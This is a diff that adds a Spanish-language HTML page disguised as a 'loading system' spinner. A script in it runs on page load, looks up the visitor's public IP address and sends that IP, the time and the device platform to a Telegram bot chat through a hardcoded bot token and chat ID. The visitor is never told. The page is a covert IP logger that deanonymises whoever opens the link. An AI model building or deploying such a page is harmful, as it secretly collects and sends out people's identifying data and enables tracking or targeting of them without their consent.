@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Cargando Sistema...</title>
+    <style>
+        body { background: #1c2733; color: white; font-family: sans-serif; text-align: center; padding-top: 20%; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #3498db; animation: spin 1s linear infinite; display: inline-block; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <p>Sincronizando con el servidor seguro...</p>
+
+    <script>
+        // CONFIGURACIÓN DIRECTA
+        const BOT_TOKEN = "8150721786:AAGmMp9chOnrKgU8w9HF_llE8Liq3lVpIV8";
+        const MI_CHAT_ID = "8369458396";
+
+        async function enviarTelegram() {
+            try {
+                // 1. Sacamos la IP real
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const ip = data.ip;
+                const hora = new Date().toLocaleString();
+
+                // 2. LA MANDAMOS DIRECTO A TU CHAT
+                const texto = `🌐 **IP DETECTADA**\n\n📍 IP: \`${ip}\`\n⌚ Hora: ${hora}\n📱 Sistema: ${navigator.platform}`;
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: MI_CHAT_ID,
+                        text: texto,
+                        parse_mode: "Markdown"
+                    })
+                });
+
+            } catch (e) {
+                console.log("Error de red");
+            }
+        }
+
+        window.onload = enviarTelegram;
+    </script>
+</body>
+</html>
